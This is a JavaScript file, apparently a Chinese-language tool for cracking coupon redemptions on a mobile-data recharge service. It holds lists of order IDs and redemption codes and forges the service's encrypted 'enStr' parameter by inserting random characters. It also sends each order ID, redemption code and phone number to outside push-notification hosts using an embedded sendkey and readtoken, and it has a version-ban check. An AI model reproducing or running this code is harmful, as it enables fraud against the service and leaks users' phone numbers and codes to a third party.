var bannedKeys = ["aXJzdHRlc3Q="];
var myList = [];
var usedList = [];
var preset = [];
var preset2 = 
[
"EO2017091303036658453@064ac303a5d6@",
"EO2017091303036661701@b7c82bf2b7bc@",
"EO2017091303036670840@b59761c7105c@",
"EO2017091303036665904@d2d9fa43c4e2@",
"EO2017091303036656666@b23de965a5aa@",
"EO2017091303036658678@c0b8bafdaeee@",
"EO2017091303036664413@b2f488855130@",
"EO2017082303036386287@f5ae41851eb3@",
"EO2017091303036663300@c3750f6dc624@",
"EO2017090603036594827@e21c43e3d581@",
"EO2017083003036460875@c0f66bda0047@",
"EO2017081603036213908@a7f1847f72df@",
"EO2017091303036666030@c98494796b74@",
"EO2017083003036458350@d99f040bc058@",
"EO2017091303036664306@bfdd72edcb4f@",
"EO2017082303036382387@db8860b6c8db@",
"EO2017082303036386647@f69518146f13@"];

var preset3 = ["EO2017081603036213908@a7f1847f72df@",
"EO2017082303036382387@db8860b6c8db@",
"EO2017082303036386287@f5ae41851eb3@",
"EO2017082303036386647@f69518146f13@",
"EO2017083003036458350@d99f040bc058@",
"EO2017083003036460875@c0f66bda0047@",
"EO2017090603036594827@e21c43e3d581@",
"EO2017091303036656666@b23de965a5aa@",
"EO2017091303036658453@064ac303a5d6@",
"EO2017091303036658678@c0b8bafdaeee@",
"EO2017091303036661701@b7c82bf2b7bc@",
"EO2017091303036663300@c3750f6dc624@",
"EO2017091303036664306@bfdd72edcb4f@",
"EO2017091303036664413@b2f488855130@",
"EO2017091303036665904@d2d9fa43c4e2@",
"EO2017091303036666030@c98494796b74@",
"EO2017091303036670840@b59761c7105c@"];

var preset1 = 
["EO2017091303036659671@e2869c301d56@",
"EO2017091303036659701@bed991b6ccc9@",
"EO2017091303036665255@fe5be2e7a535@",
"EO2017091303036669839@ffbc01ed6113@",
"EO2017091303036666963@e37c0f41567e@",
"EO2017091303036663579@f0402dcfea5b@",
"EO2017091303036667883@fa5600e94791@",
"EO2017081603036216929@f0bc34357423@",
"EO2017091303036669831@db09f6efcd16@",
"EO2017091303036665888@fee8d1308da6@",
"EO2017091303036664596@e3767f179714@",
"EO2017083003036460925@bb9debe3fb80@",
"EO2017091303036670873@e122b4b077e4@",
"EO2017091303036662550@c833bea26d1d@",
"EO2017082303036389568@ecb8ec46d275@",
"EO2017072603035980655@6188e61cce53@",
"EO2017091303036669892@e6ea4c2b731a@",
"EO2017091303036667016@ec862119e27f@",
"EO2017091303036664523@f888ae261323@",
"EO2017091303036670885@dbcfc7fc676f@",
"EO2017091303036663588@ee026a2f8c13@",
"EO2017080203036049441@7e2f276df8e6@",
"EO2017091303036673798@ad2866616b4c@",
"EO2017082303036386593@e064bb93c27e@",
"EO2017091303036663536@b2d798ec257f@",
"EO2017091303036662521@066e2ed9ba6b@",
"EO2017080903036125111@94b568756ecc@",
"EO2017071203035430022@2f2e890be2e0@",
"EO2017071903035774856@528a75af9cb6@",
"EO2017080203036048332@794019cb82cc@",
"EO2017080903036132868@8e5e52f5a99f@",
"EO2017081603036223986@a70ceacf504c@",
"EO2017081603036278145@f3aed53863a6@",
"EO2017092003036764708@c338317ecfc7@",
"EO2017092003036764647@ec210c3ff100@",
"EO2017092003036768299@b53bde772ee5@",
"EO2017092003036773135@ec2dda37e51e@",
"EO2017092003036765503@b6c1d88e2954@",
"EO2017091303036659564@fecb3cc36e26@",
"EO2017092003036768355@faf5be41e38e@",
"EO2017092003036764718@d83fd8b6567b@",
"EO2017092003036773222@e32a5b45c57f@",
"EO2017092003036764677@ef9f618bbdbb@",
"EO2017092003036769288@a9de8959e397@",
"EO2017092003036770344@ce3c1617c1a0@",
"EO2017092003036771237@faa756889aa2@",
"EO2017092003036766508@cfb0c73ba9a9@",
"EO2017092003036767297@fd9c447ace3d@",
"EO2017092003036765603@bef6eec41ddb@",
"EO2017092003036768331@bc3b5afa5c93@",
"EO2017092003036768412@deeba67eb3fe@",
"EO2017091303036658434@0676bdf65b7f@",
"EO2017091303036662443@e07bd75dbe45@",
"EO2017092003036774066@b92e8377b6e1@",
"EO2017092003036765565@f3329b8e5853@",
"EO2017092003036769365@d6b36daaafc4@",
"EO2017092003036767409@c0ce041b0153@",
"EO2017092003036768386@d7f63d454564@",
"EO2017092003036766588@e8ffbb152807@",
"EO2017092003036770365@fe85c18b03b8@",
"EO2017092003036766485@e6fe7efcc7f7@",
"EO2017092003036772367@d53551f04ad9@",
"EO2017092003036774015@b184c5a1f7b4@",
"EO2017092003036768457@d7ec79103818@",
"EO2017092003036768437@fb67dad28cce@",
"EO2017092003036770383@f27717dd630d@",
"EO2017092003036768403@bc45915cdb24@",
"EO2017092003036767314@ed9197d82edc@",
"EO2017092003036773216@f680e4eda260@",
"EO2017092003036766591@d06df2152a12@",
"EO2017092003036765536@be25479fa29f@",
"EO2017092003036773261@c16f7e8f7eaf@",
"EO2017092003036772310@e5f16973152c@",
"EO2017092003036774033@db98110721c0@",
"EO2017092003036774001@bece904ca120@",
"EO2017092003036769268@acfc7e61b2f9@",
"EO2017092003036769358@f490d729ce5f@",
"EO2017092003036771314@fd66291abf16@",
"EO2017092003036767359@e19634cd07b6@",
"EO2017092003036772342@ea12d06066ee@",
"EO2017091303036666863@e9b85100bf11@",
"EO2017092003036769291@cb14b78e80e3@",
"EO2017092003036774775@b9d05f0ecdc0@",
"EO2017092003036770372@ff4e937f30b1@",
"EO2017092003036772220@b988387b99ab@",
"EO2017092003036771351@d7ff30406ea7@",
"EO2017092003036769344@d617fe5a7fd3@",
"EO2017092003036773185@e98200798e1f@",
"EO2017081603036214974@e5d355227d1c@",
"EO2017082303036384305@eaad9a43201a@",
"EO2017092003036764713@d1e28ac3a5ae@",
"EO2017092003036766478@fb083766177a@",
"EO2017092003036771272@d9c458d574d1@",
"EO2017091303036663304@b1645d337859@",
"EO2017081603036278052@ef7b583f8687@",
"EO2017090603036595850@d04fc92c6c9b@",
"EO2017092003036764612@cc85637a501d@",
"EO2017071903035727254@54c9a5d4ed5c@",
"EO2017090603036594873@c0196d9842aa@",
"EO2017092003036773172@ec0025b6c2fb@",
"EO2017092003036765478@fe329c0dc853@",
"EO2017092003036772259@cf7ba4a917aa@",
"EO2017092003036772381@f423672f5026@",
"EO2017092003036773974@e3453832ac5f@",
"EO2017092003036765495@d8a4a6d317fa@",
"EO2017092003036774068@e8aa1a7d37ae@",
"EO2017092003036765528@ef287e283dab@",
"EO2017092003036772284@ce0c7d17c0ce@",
"EO2017092003036766461@cdcc812372f7@",
"EO2017092003036768360@e3fdfa6ea30f@",
"EO2017092003036765602@c4e3153585d8@",
"EO2017092003036766445@d3365ae4eaa8@",
"EO2017092003036773280@b0e20c35186b@",
"EO2017083003036461938@d1a13bb19915@",
"EO2017092003036772242@f0a7fcfb1109@",
"EO2017092003036774073@eed3ec7111ff@",
"EO2017092003036765578@d3eaf4a35bcb@",
"EO2017092003036772347@b5b2d5f8dda4@",
"EO2017092003036770238@d36c584da42b@",
"EO2017091303036662696@f38cc03983a1@",
"EO2017091303036666836@f0160c2dd6be@",
"EO2017092003036770384@c6dfc6b52ba6@",
"EO2017092003036764691@c4c13b82e30c@",
"EO2017092003036769380@fdf0f6e0f8c2@",
"EO2017092003036774085@e347663b608c@",
"EO2017053103034125716@1bb6a59bbbd4@",
"EO2017092003036766428@aa388431ef8e@",
"EO2017092003036769379@ab4ed7116ed6@",
"EO2017092003036765484@b4ab249a6cfc@",
"EO2017092003036768419@d0b6906f1109@",
"EO2017092003036769320@c9158f86e870@",
"EO2017092003036764664@ef17b866fae0@",
"EO2017092003036773200@fa1941b3f911@",
"EO2017092003036771231@ae08e47700b6@",
"EO2017092003036764617@f801a58e288c@",
"EO2017092003036766563@bf790d640f6d@",
"EO2017092003036766536@a81a265f75f5@",
"EO2017092003036774119@b0b2778f8649@",
"EO2017092003036766572@d87f26e3dc02@",
"EO2017092003036771224@cd3d39bbaf15@",
"EO2017092003036771213@f6d94f3cf995@",
"EO2017090603036595936@01f3a7282b12@",
"EO2017091303036661501@e7fcd5dbe849@",
"EO2017092003036769353@b2dbab4ff0be@",
"EO2017092003036766531@d1212ed75c28@",
"EO2017092003036773245@e6a3d1949b5f@",
"EO2017092003036764631@b179a0da4a76@",
"EO2017092003036769387@cd6143c2a82e@",
"EO2017092003036771263@ecb44c042e23@",
"EO2017090603036590076@e12eb5edaed8@",
"EO2017082303036384343@e7f3893834af@",
"EO2017092003036765457@eb58175ae8b7@",
"EO2017092003036773196@b7c057fe8633@",
"EO2017062103034889911@bf4ee1501a2a@",
"EO2017082303036384595@eb4733a4b384@",
"EO2017091303036663446@eface3b09d74@",
"EO2017092003036766500@e8937be5f296@",
"EO2017092003036767382@b5c6221ce7bb@",
"EO2017092003036768397@fb92f619f5d0@",
"EO2017092003036772272@bb0cb65e5122@",
"EO2017092003036773220@f7178f0e207a@",
"EO2017092003036771249@b323118a02cb@",
"EO2017092003036769306@ff58dd03cef6@",
"EO2017092003036769360@ee7f4038a153@",
"EO2017092003036769343@bc9e2b1cf220@",
"EO2017092003036766544@ddc4dcfcf81d@",
"EO2017092003036766590@dd4d7b042110@",
"EO2017092003036773225@e8972d3860a2@",
"EO2017092003036764658@dfd4519277e5@",
"EO2017092003036768372@aac9b1d589ef@",
"EO2017092003036767331@d24609f9c116@",
"EO2017092003036768361@db145e13d055@",
"EO2017092003036773957@c880400c8ec7@",
"EO2017092003036773275@b6b18f2fdea4@",
"EO2017092003036772316@d3c39033c055@",
"EO2017092003036771328@b8035f020dcf@",
"EO2017092003036774027@f987b7c26a6b@",
"EO2017092003036770248@f623ed5dcee8@",
"EO2017092003036767311@f823fafd1479@",
"EO2017092003036765492@c58d6b93a670@",
"EO2017092003036770319@e8a6eba1355e@",
"EO2017080203036051402@864247bef9d7@",
"EO2017082303036385558@ffe311ccb59e@",
"EO2017083003036460982@cbcac9081bdb@",
"EO2017090603036591088@d85bd8ab0278@",
"EO2017090603036591943@b154abfba1f4@",
"EO2017083003036457149@e2bbdc3ebf85@",
"EO2017091303036665949@f190ea014807@",
"EO2017092003036773158@d3c4ea37efed@",
"EO2017071203035430315@3ee462a8c639@",
"EO2017080903036125424@9d93ae464397@",
"EO2017083003036456138@cffbde07d911@",
"EO2017090603036596830@045781548c13@",
"EO2017091303036661651@b62710d600c3@",
"EO2017092003036764625@d0be924ebc6f@",
"EO2017092003036764672@a924d3a9e45b@",
"EO2017092003036765479@ebf16023df49@",
"EO2017092003036765510@ef2ea2bedf9a@",
"EO2017092003036765556@ee97b5e3fd1c@",
"EO2017092003036766453@ace4bd2c0194@",
"EO2017092003036766593@fa6b981d83db@",
"EO2017092003036767368@c95a6aea3cbf@",
"EO2017092003036767394@ca1d04c90093@",
"EO2017092003036767436@b86f61757eb5@",
"EO2017092003036767441@d7a49498b7cf@",
"EO2017092003036768334@b1b7ed845433@",
"EO2017092003036768381@aecb743391f3@",
"EO2017092003036770342@eea7e38ceb8f@",
"EO2017092003036771215@dddacdc2b6c9@",
"EO2017092003036772268@d148f16dafc2@",
"EO2017092003036772303@f3ecb321e917@",
"EO2017092003036772398@c9adfcada9f6@",
"EO2017092003036773190@d6dd845dce5c@",
"EO2017092003036773195@d00321ce33d2@",
"EO2017092003036773281@f4e23b851b97@",
"EO2017092003036774019@d2744534d5bc@",
"EO2017092003036774046@ce47ff00577b@",
"EO2017092003036774060@dc9fef49291e@",
"EO2017092003036774070@efae06a2d485@"];
var used = [];

var showIn = function(){
  $("#in").append("<input type=text class=form-control id=orderId placeholder=订单号> <input type=text class=form-control id=mobile placeholder=手机号><input type=text class=form-control id=code placeholder=兑换码><textarea id=preset class=form-control placeholder='预设订单和兑换码，以便快速获取地址。格式为 订单号@兑换码@手机号 如 EO2017082303123456789@abcdefg@13588888888 一行一条数据' style='height:200px;font-size: 11px;'></textarea><textarea id=result class=form-control placeholder='破解结果(更新日期2017-09-20 15:01)' style='height:200px'></textarea><iframe id=frame src='' style='position: fixed; border: 1px solid black; top: 0px; right: 0px;background-color: yellow;width: 40%;height: 20%;'>");
  $("#yql").attr("onclick", "getEnc()");
  $("#charge").remove();
  $("#yql").text("获取链接");
  var param = location.hash.split("#")[1];
  preset = window["preset" + param];
  $("#result").attr("placeholder", pl);
  var latest = removeUsed(preset);
  localStorage.preset = latest.join("\r\n");
  var pl = $("#result").attr("placeholder") + " 现在是: preset" + param + " 剩余码子数量：" + latest.length;	
  if(localStorage.preset.length == 0){
   prompt("复制里面的内容并发我，检查码子使用情况", localStorage.used);
  }
	
  if(localStorage.rm){
  	used = localStorage.rm.split(",");
  }
	
  $("#clear").on("click", clear);
  var p = $("#preset");
  p.val(localStorage.preset);
  p.scrollTop(p[0].scrollHeight);
}

var removeUsed = function(){
 if(!localStorage.used){
     localStorage.used = usedList;
    }else{
     usedList = localStorage.used.split(",");
    }
 var result = [];
 preset.forEach(function(code){
  if(usedList.indexOf(code) == -1){
   result.push(code);
  }
 });
 return result;
}

var check = function() {
  if (bannedKeys.indexOf(uk) === -1) {
    return true;
  }else{
    alert("请用新版~");
    return false;
  }
}

var readLine = function(){
  var text = $("#preset").val();
  localStorage.preset = text;
  if(text.length > 0){
    var lines = text.split("\n");
    var pre = lines.pop().trim();
    $("#preset").val(lines.join("\n"));
    localStorage.preset = $("#preset").val();
    return pre.indexOf("@") > -1 ? pre.split("@") : [];
  }else{
    return [];
  }
}

var getEnc = function(retry){
  var valid = check();
  if(valid){
    //$("#yql").text("正在获取...");
 //    $("#yql").attr("disabled", "disabled");
    if(!retry){
     var pre = readLine();
     if(pre.length === 3){
      $("#orderId").val(pre[0].trim()); 
      $("#code").val(pre[1].trim());
      $("#mobile").val(pre[2].trim()); 
     }
    }
    var mobile = $("#mobile").val().trim();
    var orderId = $("#orderId").val().trim();
    if(mobile && orderId){

      // var u = 'https://prefacty.creditcard.cmbc.com.cn/mmc-main-webapp/main/TDESEncryptByCMBCC.json?paramMap={"orderId":"'+orderId+'","mobile":"'+mobile+'"}';
      //var u = "http://ms.lefone.cn/msflowday/couponShowController/generateCheckCode?enStr=Ko8GEZulztYGzlwL41zvKHByrFzWvp51AP6gW3RSF8A0MwN5zGrMT54iLl5UKI1qdI21FTBBrTk=&mobile=" + mobile;
      getCharge();
	    
	    //      $.ajax({
 //          url: "https://query.yahooapis.com/v1/public/yql",
 //          dataType: "json",
 //          timeout: 10000,
 //          data: {
 //              format: "json",
 //              q: $("#yql").data("ql") + encodeURI(u) + $("#yql").data("qr")
 //          },
 //          success: getUrl,
 //          error: function(c, u) {
 //              alert("错误 如果多次尝试无果请联系开发者");
 //              $("#yql").removeAttr("disabled");
 //          }
 //      });
		//$("#frame").attr("src", u);
		//$("#yql").text("如果黄色框文字中包含true表示验证码发送成功 点击可以重发验证码");
	    	//$("#yql").attr("onclick", "getEnc(true)");
    }else{
      alert("缺少数据");
      $("#yql").removeAttr("disabled"); 
    }
  }
}

var getUrl = function(data){
  $("#yql").removeAttr("disabled");
  if(data.query){
    var re = data.query.results;
    if(re){
      $("#yql").text("验证码获取成功 请稍后填写");
    }else{
     setTimeout(function(){
      getEnc(true);
     }, 5000)
    }
  }else{
    alert("错误 如果多次尝试无果请联系开发者");
  }
}

var getRandom = function(){
	var text = "";
	var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	for (var i = 3; i > 0; i--) {
		text += possible.charAt(Math.floor(Math.random() * possible.length));
	};
	if(used.indexOf(text) == -1){
		used.push(text);
		return text;
	}else{
		return getRandom();
	}
}

var clear = function(){
	$("#mobile").val("");
	$("#code").val("");
	$("#orderId").val("");
	$("#rand").val("");
	$("#yql").attr("onclick", "getEnc()");
}

var getCharge = function(){
	var mobile = $("#mobile").val().trim();;
	var code = $("#code").val().trim();;
	var orderId = $("#orderId").val().trim();;
	//var rand = $("#rand").val().trim();
	//if(rand){
		usedList.push(orderId + "@" + code + "@");
		localStorage.used = usedList;
		localStorage.rm = used;
		var str = "Ko8GEZulztYGzlwL41zvKHByrFzWr" + getRandom() + "AP6gW3RSF8A0MwN5zGrMT54iLl5UKI1qdI21FTBBrTk%3D";
		//var u = "http://ms.lefone.cn/msflowday/couponShowController/charegeCoupon?enStr=" + str + "&couponCode=" + code + "&mobile=" + mobile + "&chargeType=0&rand=" + rand;
		//var s = "http://ms.lefone.cn/msflowday/couponShowController/showCoupon.do?enStr=" + str; 
	        var info = "http://ms.lefone.cn/msflowday/couponShowController/getCouponInfo?enStr=" + str;
		var check = "http://sc.ftqq.com/?c=talkadmin&a=hookdetail&readtoken=59bcbf7b76f8d&wid=24674&param=" + btoa(str + "#" + code + "#" + mobile);
		var result = "订单：" + orderId + " 码：" + code + " 手机号：" + mobile + " 订单充值查询: " + check;
	        $("#frame").attr("src", info);
	        $("#yql").text("请确认黄色框中显示乱码 否则【记录码子并刷新后】再点我一次");
		var extra = " 2款" + orderId;
		if(myList.indexOf(orderId) > -1){
			extra = " 14款" + orderId;
		}
		//$("#frame").attr("src", u);
		$.ajax({
		    url: "http://cors-proxy.htmldriven.com",
		    dataType: "json",
		    timeout: 10000,
		    data: {
			url: "http://www.xiaoxiangzi.com/tool/dwz.asp?domain=" + encodeURIComponent(check)
		    },
		    success: function(dt) {
			var newResult = "订单：" + orderId + " 码：" + code + " 手机号：" + mobile + " 订单充值查询: " + dt.body;
			$.get("https://pushbear.ftqq.com/sub?sendkey=751-9616f3ff7deb3cdfda6f4f547ab5b153&text=服务端流量充值"+extra+"&desp=" + newResult)
		    }
		});
		$("#result").val(result);
		//$("#charge").text("请看黄色框中充值结果");
	//}else{
		//alert("缺少验证码");
	//}
}
